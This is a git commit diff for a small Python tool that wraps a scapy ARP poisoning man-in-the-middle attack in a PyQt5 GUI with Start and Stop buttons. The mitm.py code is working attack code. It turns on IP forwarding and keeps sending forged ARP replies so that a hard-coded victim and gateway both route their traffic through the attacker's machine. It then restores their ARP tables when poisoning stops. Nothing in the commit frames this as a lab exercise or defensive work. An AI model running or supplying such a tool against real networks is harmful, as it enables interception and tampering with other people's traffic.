2ed82432649ba90b4f2d4704f2dd2491984a391f
root <root@debian>
2019-02-22 10:32:14 +0100

    thread ok

--- display.py
+++ display.py
@@ -1,7 +1,9 @@
 import sys
-from os import geteuid
+import os
 from PyQt5.QtWidgets import QWidget, QPushButton, QApplication
 from mitm import *
+
+arp_poison = Arp_poison()
 
 class Main(QWidget):
     
@@ -9,42 +11,23 @@ class Main(QWidget):
         super().__init__()
         self.initUI()
         
+    def initUI(self):
+        startPoisonBtn = QPushButton('StartPoison', self)
+        startPoisonBtn.move(72,50)
+        startPoisonBtn.clicked.connect(arp_poison.enablePoison)
         
-    def initUI(self):               
+        stopPoisonBtn = QPushButton('StopPoison', self)
+        stopPoisonBtn.move(72, 100)
+        stopPoisonBtn.clicked.connect(arp_poison.disablePoison)
+
         exitBtn = QPushButton('Exit', self)
-        exitBtn.clicked.connect(QApplication.instance().quit)
-        exitBtn.resize(exitBtn.sizeHint())
         exitBtn.move(72, 150)
-
-        func1Btn = QPushButton('Function 1', self)
-        func1Btn.move(72,50)
-        func1Btn.clicked.connect(self.func1)
-
-        func2Btn = QPushButton('Function 2', self)
-        func2Btn.move(72,100)
-        func2Btn.clicked.connect(self.func2)
- 
-        self.setGeometry(800, 300, 220, 250)
+        exitBtn.clicked.connect(self.close)
+        
+        self.setGeometry(800, 250, 220, 250)
         self.setWindowTitle('Mitm')
         self.show()
-    
-    def func1(self):
-        try:
-            interface = "eth0"
-            victimIP = "192.168.0.22"
-            gateIP = "192.168.0.2"
-        except KeyboardInterrupt:
-            print("\n[*] User Requested Shutdown")
-            print("[*] Exiting...")
-            sys.exit(1)
- 
-            print("\n[*] Enabling IP Forwarding...\n")
-            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-            mitm()
 
-    def func2(self):
-        print('2')
-        
 if __name__ == '__main__':
     app = QApplication(sys.argv)
     run = Main()
--- mitm.py
+++ mitm.py
@@ -1,45 +1,64 @@
-def get_mac(IP):
-        conf.verb = 0
-        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
-        for snd,rcv in ans:
-                return rcv.sprintf(r"%Ether.src%")
+import os
+import sys
+import time
+from scapy.all import *
+
+interface = "eth0"
+victimIP = "192.168.0.13"
+gateIP = "192.168.0.2"
+
+class Arp_poison:
+        def __init__(self):
+                self.run_poison = True
+
+        def enablePoison(self):
+                print("\n[*] Enabling IP Forwarding...\n")
+                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+                poison_thread = threading.Thread(target=self.poison, args=())
+                poison_thread.deamon = True
+                poison_thread.start()
+
+        def disablePoison(self):
+                self.run_poison = False
+
+        def get_mac(self, IP):
+                conf.verb = 0
+                ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
+                for snd,rcv in ans:
+                        return rcv.sprintf(r"%Ether.src%")
  
-def reARP():
-       
-        print("\n[*] Restoring Targets...")
-        victimMAC = get_mac(victimIP)
-        gateMAC = get_mac(gateIP)
-        send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
-        send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
-        print("[*] Disabling IP Forwarding...")
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        print("[*] Shutting Down...")
-        sys.exit(1)
- 
-def trick(gm, vm):
-        send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
-        send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
- 
-def mitm():
-        try:
-                victimMAC = get_mac(victimIP)
-        except Exception:
+        def reARP(self):
+                print("\n[*] Restoring Targets...")
+                victimMAC = self.get_mac(victimIP)
+                gateMAC = self.get_mac(gateIP)
+                send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
+                send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
+                print("[*] Disabling IP Forwarding...")
                 os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-                print("[!] Couldn't Find Victim MAC Address")
-                print("[!] Exiting...")
-                sys.exit(1)
-        try:
-                gateMAC = get_mac(gateIP)
-        except Exception:
-                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-                print("[!] Couldn't Find Gateway MAC Address")
-                print("[!] Exiting...")
-                sys.exit(1)
-        print("[*] Poisoning Targets...")
-        while 1:
+                print("[*] Poison Stopped.")
+ 
+        def trick(self, gm, vm):
+                send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
+                send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
+
+        def poison(self):
                 try:
-                        trick(gateMAC, victimMAC)
+                        victimMAC = self.get_mac(victimIP)
+                except Exception:
+                        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+                        print("[!] Couldn't Find Victim MAC Address")
+                        print("[!] Exiting...")
+                        sys.exit(1)
+                try:
+                        gateMAC = self.get_mac(gateIP)
+                except Exception:
+                        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+                        print("[!] Couldn't Find Gateway MAC Address")
+                        print("[!] Exiting...")
+                        sys.exit(1)
+                print("[*] Poisoning Targets...")
+
+                while self.run_poison:
+                        self.trick(gateMAC, victimMAC)
                         time.sleep(1.5)
-                except KeyboardInterrupt:
-                        reARP()
-                        break
+                self.reARP()
